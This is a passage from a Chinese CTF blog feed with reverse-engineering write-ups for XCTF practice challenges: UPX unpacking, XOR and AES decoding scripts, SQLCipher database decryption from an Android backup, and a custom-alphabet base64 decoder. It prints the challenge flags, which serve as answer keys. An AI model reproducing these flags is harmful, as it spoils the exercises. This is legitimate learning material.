class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mul_401100</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> a*b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_401220</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> a-b</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_401000</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line">flag=[<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">v121 = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your flag is:&quot;</span>)</span><br><span class="line">v3 = mul_401100(flag[<span class="number">0</span>], <span class="number">0x3B9ACA00</span>)</span><br><span class="line">v4 = sub_401220(v3, <span class="number">0x3B9AC9CE</span>)</span><br><span class="line">flag[<span class="number">0</span>]=mul_401100(v4, <span class="number">2</span>)</span><br><span class="line">v5 = add_401000(flag[<span class="number">1</span>], <span class="number">0x4C4B40</span>)</span><br><span class="line">v6 = sub_401220(v5, <span class="number">0x65B9AA</span>)</span><br><span class="line">v7 = add_401000(v6, <span class="number">1666666</span>)</span><br><span class="line">v8 = add_401000(v7, <span class="number">45</span>)</span><br><span class="line">v9 = mul_401100(v8, <span class="number">2</span>)</span><br><span class="line">flag[<span class="number">1</span>]=add_401000(v9, <span class="number">5</span>)</span><br><span class="line">v10 = mul_401100(flag[<span class="number">2</span>], <span class="number">0x3B9ACA00</span>)</span><br><span class="line">v11 = sub_401220(v10, <span class="number">999999950</span>)</span><br><span class="line">v12 = mul_401100(v11, <span class="number">2</span>)</span><br><span class="line">flag[<span class="number">2</span>]=add_401000(v12, <span class="number">2</span>)</span><br><span class="line">v13 = add_401000(flag[<span class="number">3</span>], <span class="number">55</span>)</span><br><span class="line">v14 = sub_401220(v13, <span class="number">3</span>)</span><br><span class="line">v15 = add_401000(v14, <span class="number">4</span>)</span><br><span class="line">flag[<span class="number">3</span>]=sub_401220(v15, <span class="number">1</span>)</span><br><span class="line">v16 = mul_401100(flag[<span class="number">4</span>], <span class="number">100000000</span>)</span><br><span class="line">v17 = sub_401220(v16, <span class="number">99999950</span>)</span><br><span class="line">v18 = mul_401100(v17, <span class="number">2</span>)</span><br><span class="line">flag[<span class="number">4</span>]=add_401000(v18, <span class="number">2</span>)</span><br><span class="line">v19 = sub_401220(flag[<span class="number">5</span>], <span class="number">1</span>)</span><br><span class="line">v20 = mul_401100(v19, <span class="number">1000000000</span>)</span><br><span class="line">v21 = add_401000(v20, <span class="number">55</span>)</span><br><span class="line">flag[<span class="number">5</span>]=sub_401220(v21, <span class="number">3</span>)</span><br><span class="line">v22 = mul_401100(flag[<span class="number">6</span>], <span class="number">1000000</span>)</span><br><span class="line">v23 = sub_401220(v22, <span class="number">999975</span>)</span><br><span class="line">flag[<span class="number">6</span>]=mul_401100(v23, <span class="number">4</span>)</span><br><span class="line">v24 = add_401000(flag[<span class="number">7</span>], <span class="number">55</span>)</span><br><span class="line">v25 = sub_401220(v24, <span class="number">33</span>)</span><br><span class="line">v26 = add_401000(v25, <span class="number">44</span>)</span><br><span class="line">flag[<span class="number">7</span>]=sub_401220(v26, <span class="number">11</span>)</span><br><span class="line">v27 = mul_401100(flag[<span class="number">8</span>], <span class="number">10</span>)</span><br><span class="line">v28 = sub_401220(v27, <span class="number">5</span>)</span><br><span class="line">v29 = mul_401100(v28, <span class="number">8</span>)</span><br><span class="line">flag[<span class="number">8</span>]=add_401000(v29, <span class="number">9</span>)</span><br><span class="line">v30 = add_401000(flag[<span class="number">9</span>], <span class="number">0</span>)</span><br><span class="line">v31 = sub_401220(v30, <span class="number">0</span>)</span><br><span class="line">v32 = add_401000(v31, <span class="number">11</span>)</span><br><span class="line">v33 = sub_401220(v32, <span class="number">11</span>)</span><br><span class="line">flag[<span class="number">9</span>]=add_401000(v33, <span class="number">53</span>)</span><br><span class="line">v34 = add_401000(flag[<span class="number">10</span>], <span class="number">49</span>)</span><br><span class="line">v35 = sub_401220(v34, <span class="number">2</span>)</span><br><span class="line">v36 = add_401000(v35, <span class="number">4</span>)</span><br><span class="line">flag[<span class="number">10</span>]=sub_401220(v36, <span class="number">2</span>)</span><br><span class="line">v37 = mul_401100(flag[<span class="number">11</span>], <span class="number">1000000</span>)</span><br><span class="line">v38 = sub_401220(v37, <span class="number">999999</span>)</span><br><span class="line">v39 = mul_401100(v38, <span class="number">4</span>)</span><br><span class="line">flag[<span class="number">11</span>]=add_401000(v39, <span class="number">50</span>)</span><br><span class="line">v40 = add_401000(flag[<span class="number">12</span>], <span class="number">1</span>)</span><br><span class="line">v41 = add_401000(v40, <span class="number">1</span>)</span><br><span class="line">v42 = add_401000(v41, <span class="number">1</span>)</span><br><span class="line">v43 = add_401000(v42, <span class="number">1</span>)</span><br><span class="line">v44 = add_401000(v43, <span class="number">1</span>)</span><br><span class="line">v45 = add_401000(v44, <span class="number">1</span>)</span><br><span class="line">v46 = add_401000(v45, <span class="number">10</span>)</span><br><span class="line">flag[<span class="number">12</span>]=add_401000(v46, <span class="number">32</span>)</span><br><span class="line">v47 = mul_401100(flag[<span class="number">13</span>], <span class="number">10</span>)</span><br><span class="line">v48 = sub_401220(v47, <span class="number">5</span>)</span><br><span class="line">v49 = mul_401100(v48, <span class="number">8</span>)</span><br><span class="line">v50 = add_401000(v49, <span class="number">9</span>)</span><br><span class="line">flag[<span class="number">13</span>]=add_401000(v50, <span class="number">48</span>)</span><br><span class="line">v51 = sub_401220(flag[<span class="number">14</span>], <span class="number">1</span>)</span><br><span class="line">v52 = mul_401100(v51, -<span class="number">294967296</span>)</span><br><span class="line">v53 = add_401000(v52, <span class="number">55</span>)</span><br><span class="line">flag[<span class="number">14</span>]=sub_401220(v53, <span class="number">3</span>)</span><br><span class="line">v54 = add_401000(flag[<span class="number">15</span>], <span class="number">1</span>)</span><br><span class="line">v55 = add_401000(v54, <span class="number">2</span>)</span><br><span class="line">v56 = add_401000(v55, <span class="number">3</span>)</span><br><span class="line">v57 = add_401000(v56, <span class="number">4</span>)</span><br><span class="line">v58 = add_401000(v57, <span class="number">5</span>)</span><br><span class="line">v59 = add_401000(v58, <span class="number">6</span>)</span><br><span class="line">v60 = add_401000(v59, <span class="number">7</span>)</span><br><span class="line">flag[<span class="number">15</span>]=add_401000(v60, <span class="number">20</span>)</span><br><span class="line">v61 = mul_401100(flag[<span class="number">16</span>], <span class="number">10</span>)</span><br><span class="line">v62 = sub_401220(v61, <span class="number">5</span>)</span><br><span class="line">v63 = mul_401100(v62, <span class="number">8</span>)</span><br><span class="line">v64 = add_401000(v63, <span class="number">9</span>)</span><br><span class="line">flag[<span class="number">16</span>]=add_401000(v64, <span class="number">48</span>)</span><br><span class="line">v65 = add_401000(flag[<span class="number">17</span>], <span class="number">7</span>)</span><br><span class="line">v66 = add_401000(v65, <span class="number">6</span>)</span><br><span class="line">v67 = add_401000(v66, <span class="number">5</span>)</span><br><span class="line">v68 = add_401000(v67, <span class="number">4</span>)</span><br><span class="line">v69 = add_401000(v68, <span class="number">3</span>)</span><br><span class="line">v70 = add_401000(v69, <span class="number">2</span>)</span><br><span class="line">v71 = add_401000(v70, <span class="number">1</span>)</span><br><span class="line">flag[<span class="number">17</span>]=add_401000(v71, <span class="number">20</span>)</span><br><span class="line">v72 = add_401000(flag[<span class="number">18</span>], <span class="number">7</span>)</span><br><span class="line">v73 = add_401000(v72, <span class="number">2</span>)</span><br><span class="line">v74 = add_401000(v73, <span class="number">4</span>)</span><br><span class="line">v75 = add_401000(v74, <span class="number">3</span>)</span><br><span class="line">v76 = add_401000(v75, <span class="number">6</span>)</span><br><span class="line">v77 = add_401000(v76, <span class="number">5</span>)</span><br><span class="line">v78 = add_401000(v77, <span class="number">1</span>)</span><br><span class="line">flag[<span class="number">18</span>]=add_401000(v78, <span class="number">20</span>)</span><br><span class="line">v79 = mul_401100(flag[<span class="number">19</span>], <span class="number">1000000</span>)</span><br><span class="line">v80 = sub_401220(v79, <span class="number">999999</span>)</span><br><span class="line">v81 = mul_401100(v80, <span class="number">4</span>)</span><br><span class="line">v82 = add_401000(v81, <span class="number">50</span>)</span><br><span class="line">flag[<span class="number">19</span>]=sub_401220(v82, <span class="number">1</span>)</span><br><span class="line">v83 = sub_401220(flag[<span class="number">20</span>], <span class="number">1</span>)</span><br><span class="line">v84 = mul_401100(v83, -<span class="number">294967296</span>)</span><br><span class="line">v85 = add_401000(v84, <span class="number">49</span>)</span><br><span class="line">flag[<span class="number">20</span>]=sub_401220(v85, <span class="number">1</span>)</span><br><span class="line">v86 = sub_401220(flag[<span class="number">21</span>], <span class="number">1</span>)</span><br><span class="line">v87 = mul_401100(v86, <span class="number">1000000000</span>)</span><br><span class="line">v88 = add_401000(v87, <span class="number">54</span>)</span><br><span class="line">v89 = sub_401220(v88, <span class="number">1</span>)</span><br><span class="line">v90 = add_401000(v89, <span class="number">1000000000</span>)</span><br><span class="line">flag[<span class="number">21</span>]=sub_401220(v90, <span class="number">1000000000</span>)</span><br><span class="line">v91 = add_401000(flag[<span class="number">22</span>], <span class="number">49</span>)</span><br><span class="line">v92 = sub_401220(v91, <span class="number">1</span>)</span><br><span class="line">v93 = add_401000(v92, <span class="number">2</span>)</span><br><span class="line">flag[<span class="number">22</span>]=sub_401220(v93, <span class="number">1</span>)</span><br><span class="line">v94 = mul_401100(flag[<span class="number">23</span>], <span class="number">10</span>)</span><br><span class="line">v95 = sub_401220(v94, <span class="number">5</span>)</span><br><span class="line">v96 = mul_401100(v95, <span class="number">8</span>)</span><br><span class="line">v97 = add_401000(v96, <span class="number">9</span>)</span><br><span class="line">flag[<span class="number">23</span>]=add_401000(v97, <span class="number">48</span>)</span><br><span class="line">v98 = add_401000(flag[<span class="number">24</span>], <span class="number">1</span>)</span><br><span class="line">v99 = add_401000(v98, <span class="number">3</span>)</span><br><span class="line">v100 = add_401000(v99, <span class="number">3</span>)</span><br><span class="line">v101 = add_401000(v100, <span class="number">3</span>)</span><br><span class="line">v102 = add_401000(v101, <span class="number">6</span>)</span><br><span class="line">v103 = add_401000(v102, <span class="number">6</span>)</span><br><span class="line">v104 = add_401000(v103, <span class="number">6</span>)</span><br><span class="line">flag[<span class="number">24</span>]=add_401000(v104, <span class="number">20</span>)</span><br><span class="line">v105 = add_401000(flag[<span class="number">25</span>], <span class="number">55</span>)</span><br><span class="line">v106 = sub_401220(v105, <span class="number">33</span>)</span><br><span class="line">v107 = add_401000(v106, <span class="number">44</span>)</span><br><span class="line">v108 = sub_401220(v107, <span class="number">11</span>)</span><br><span class="line">flag[<span class="number">25</span>]=add_401000(v108, <span class="number">42</span>)</span><br><span class="line">flag[<span class="number">26</span>]=add_401000(flag[<span class="number">26</span>], flag[<span class="number">25</span>])</span><br><span class="line">flag[<span class="number">27</span>]=add_401000(flag[<span class="number">27</span>], flag[<span class="number">12</span>])</span><br><span class="line">v109 = flag[<span class="number">27</span>]</span><br><span class="line">v110 = sub_401220(flag[<span class="number">28</span>], <span class="number">1</span>)</span><br><span class="line">v111 = add_401000(v110, v109)</span><br><span class="line">flag[<span class="number">28</span>]=sub_401220(v111, <span class="number">1</span>)</span><br><span class="line">v112 = flag[<span class="number">23</span>]</span><br><span class="line">v113 = sub_401220(flag[<span class="number">29</span>], <span class="number">1</span>)</span><br><span class="line">v114 = mul_401100(v113, <span class="number">1000000</span>)</span><br><span class="line">flag[<span class="number">29</span>]=add_401000(v114, v112)</span><br><span class="line">v115 = flag[<span class="number">27</span>]</span><br><span class="line">v116 = add_401000(flag[<span class="number">30</span>], <span class="number">1</span>)</span><br><span class="line">flag[<span class="number">30</span>]=mul_401100(v116, v115)</span><br><span class="line">flag[<span class="number">31</span>]=add_401000(flag[<span class="number">31</span>], flag[<span class="number">30</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CTF&#123;&quot;</span>+<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,flag))+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Your flag is:</span></span><br><span class="line"><span class="string">CTF&#123;daf8f4d816261a41a115052a1bc21ade&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="3-easyre-153"><a href="#3-easyre-153" class="headerlink" title="3. easyre-153"></a>3. easyre-153</h1><p>查壳，UPX壳，拖进Ubuntu输入脱壳命令直接脱掉。</p><img src="/posts/5a99a36/3.1.png" class="" title="UPX脱壳"><p><a href="https://blog.csdn.net/xiao__1bai/article/details/120360202">https://blog.csdn.net/xiao__1bai/article/details/120360202</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;新手练习区完结，高手进阶区有些也做过了。如果在这里找不到笔记，请到&lt;a href=&quot;https://blog.csdn.net/Leong_Vinson&quot;&gt;小凉的CSDN博客&lt;/a&gt;去找，如果没有那就真没有了。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="x64dbg" scheme="http://example.com/tags/x64dbg/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 Android逆向合集</title>
    <link href="http://example.com/posts/9f62af2.html"/>
    <id>http://example.com/posts/9f62af2.html</id>
    <published>2022-04-05T01:29:28.252Z</published>
    <updated>2022-04-11T05:25:33.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-app1"><a href="#1-app1" class="headerlink" title="1. app1"></a>1. app1</h1><p>这道题之前做过，也没什么难度，所以不想再说了。这道题的一个知识点就是程序自身的版本号版本名在BuildConfig中存储。</p><img src="/posts/9f62af2/1.1.png" class="" title="jeb分析"><span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> v5le0n9;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="string">&quot;X&lt;cP[?PHNB&lt;P?aj&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> v3.length();</span><br><span class="line">    <span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="number">15</span>;</span><br><span class="line">    <span class="type">int</span> v0;</span><br><span class="line">    <span class="type">int</span>[] v5 = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">    <span class="keyword">for</span>(v0=<span class="number">0</span>; v0&lt;len; v0++)</span><br><span class="line">    &#123;</span><br><span class="line">        v5[v0] = v3.charAt(v0) ^ v4;</span><br><span class="line">        System.out.printf(<span class="string">&quot;%c&quot;</span>,v5[v0]);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">W3l_T0_GAM3_0ne</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="2-app2"><a href="#2-app2" class="headerlink" title="2. app2"></a>2. app2</h1><img src="/posts/9f62af2/2.1.png" class="" title="运行程序"><p>载入AK由so文件，程序可动态调试。载入jeb查看Java源码。</p><img src="/posts/9f62af2/2.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/2.3.png" class="" title="Logcat"><img src="/posts/9f62af2/2.4.png" class="" title="Logcat"><img src="/posts/9f62af2/2.5.png" class="" title="jeb分析"><p>将x86目录下的so文件载入IDA32，在Exports表里找到<code>doRawData</code>函数，查看伪代码。</p><img src="/posts/9f62af2/2.6.png" class="" title="IDA分析"><p>python3解决from Crypto.Cipher import AES报错问题：<a href="https://www.dandelioncloud.cn/article/details/1018083534028833">https://www.dandelioncloud.cn/article/details/1018083534028833</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">cipher=base64.b64decode(<span class="string">&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;</span>)</span><br><span class="line">key = <span class="string">&quot;thisisatestkey==&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">msg = aes.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(msg.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">aimagetencent</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>发现这个也不是flag。再分析一下XML文件。还有<code>FileDataActivity</code>我们还没有分析。</p><img src="/posts/9f62af2/2.7.png" class="" title="jeb分析"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">cipher=base64.b64decode(<span class="string">&quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;</span>)</span><br><span class="line">key = <span class="string">&quot;thisisatestkey==&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">msg = aes.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(msg.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Cas3_0f_A_CAK3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>所以这题到底怎么转换到<code>FileDataActivity</code>去的，迷惑。</p><h1 id="3-app3"><a href="#3-app3" class="headerlink" title="3. app3"></a>3. app3</h1><p>下载下来是一个<code>.ab</code>文件，<code>.ab</code>文件是 Android 系统的备份文件格式，它分为加密和未加密两种类型。<code>.ab</code>文件的前 24 个字节是类似文件头的东西，如果是加密的，在前 24 个字节中会有 AES-256 的标志，如果未加密，则在前 24 个字节中会有 none 的标志。</p><img src="/posts/9f62af2/3.1.png" class="" title="文件头"><p>下载<code>abe.jar</code>，将<code>.ab</code>文件解压。在abe目录下运行cmd。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar abe.jar unpack C:\Users\dell\Desktop\app3.ab app3.tar</span><br></pre></td></tr></table></figure><p><code>.tar</code>文件在Windows也可解压。找到<code>.apk</code>文件安装到模拟器，又运行不了。</p><img src="/posts/9f62af2/3.2.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.3.png" class="" title="jeb分析"><p>因为没有跳转语句，无论输入什么都是出来这句话。再看看有什么隐藏的<code>&lt;activity&gt;</code>，发现也只有我们分析过的那两个。</p><img src="/posts/9f62af2/3.4.png" class="" title="jeb分析"><p>再去那两个<code>&lt;activity&gt;</code>仔细分析我们刚才没有分析的，肯定是有什么遗漏了。</p><img src="/posts/9f62af2/3.5.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.6.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.7.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.8.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.9.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.10.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.11.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.12.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.13.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.14.png" class="" title="jeb分析"><img src="/posts/9f62af2/3.15.png" class="" title="jeb分析"><p>SHA1=”Stra1234” + “44e2e4457d4e252ca5b9fe9d20b3fea5” + “yaphetshan”= ae56f99638285eb0743d8bf76d2b0c80e5cbb096，取前7位就是ae56f99。</p><p>我们刚才说的有加密，是用SqlCipher加密的，而这个就是数据库的密码。</p><p>解压包除<code>.apk</code>文件之外，还有两个<code>.db</code>文件，一个<code>Demo.db</code>，另一个是<code>Encrypt.db</code>，因为在Java代码里面是<code>Demo.db</code>，所以解密也应该是解密这一个。</p><p>安装sqlcipher用来解密数据库，上面分析写着版本为<code>3.4.0</code>，Linux注意对应版本，Windows下载最新也就<code>3.0.1</code>，所以没问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\sqlcipher-3.0.1\bin&gt;sqlcipher-shell64.exe Demo.db</span><br><span class="line">sqlite&gt; PRAGMA key = &quot;ae56f99&quot;;</span><br><span class="line">sqlite&gt; ATTACH DATABASE &#x27;app3_1.db&#x27; AS plaintext KEY &quot;&quot;;</span><br><span class="line">sqlite&gt; SELECT sqlcipher_export(&quot;plaintext&quot;);</span><br><span class="line"></span><br><span class="line">sqlite&gt; DETACH DATABASE plaintext;</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure><p>安装SQLite数据库：<a href="https://nightlies.sqlitebrowser.org/latest/">https://nightlies.sqlitebrowser.org/latest/</a> </p><p>SQLite用来打开解密后的<code>.db</code>文件，加密的<code>.db</code>文件SQLite打不开，也就是为什么我们要解密数据库的原因。</p><img src="/posts/9f62af2/3.16.png" class="" title="数据库"><p>结果不是…那我们再试试<code>Encryto.db</code>。</p><img src="/posts/9f62af2/3.17.png" class="" title="数据库"><p>很明显的Base64，拿去解码得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0=</span><br><span class="line"></span><br><span class="line">Tctf&#123;H3ll0_Do_Y0u_Lov3_Tenc3nt!&#125;</span><br></pre></td></tr></table></figure><h1 id="4-easy-apk"><a href="#4-easy-apk" class="headerlink" title="4. easy_apk"></a>4. easy_apk</h1><img src="/posts/9f62af2/4.1.png" class="" title="运行程序"><p>载入AK没发现lib文件，载入jeb查看源码：</p><img src="/posts/9f62af2/4.2.png" class="" title="jeb分析"><p>天真的我就拿去Base64解码了，结果解码失败。回来再看，它是新Base64，点进去查看它的算法，发现它是把索引表给替换了。</p><p>拿Base64变种脚本替换索引表即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># base 字符集</span></span><br><span class="line"><span class="comment"># base64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + &#x27;+/&#x27;</span></span><br><span class="line">base64_charset = <span class="string">&quot;vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line"></span><br><span class="line">     <span class="comment"># 将每⼀位bytes转换为⼆进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位</span></span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes]</span><br><span class="line">     </span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(base64_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(base64_bytes) % <span class="number">3</span>     </span><br><span class="line">    integral_part = base64_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">         <span class="comment"># 取三个字节，以每6⽐特，转换为4个整数</span></span><br><span class="line">         tmp_unit = <span class="string">&#x27;&#x27;</span>.join(integral_part[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(tmp_unit[x: x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]]</span><br><span class="line">         <span class="comment"># 取对应base64字符</span></span><br><span class="line">         resp += <span class="string">&#x27;&#x27;</span>.join([base64_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit])</span><br><span class="line">         integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">         <span class="comment"># 补⻬三个字节，每个字节补充 0000 0000</span></span><br><span class="line">         remain_part = <span class="string">&#x27;&#x27;</span>.join(base64_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">         <span class="comment"># 取三个字节，以每6⽐特，转换为4个整数</span></span><br><span class="line">         <span class="comment"># 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=</span></span><br><span class="line">         tmp_unit = [<span class="built_in">int</span>(remain_part[x: x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>]][:remain + <span class="number">1</span>]</span><br><span class="line">         resp += <span class="string">&#x27;&#x27;</span>.join([base64_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">base64_str</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_base64_str(base64_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytearray</span>()</span><br><span class="line">    </span><br><span class="line">    base64_bytes = [<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(base64_charset.index(s))).replace(<span class="string">&#x27;0b&#x27;</span>,<span 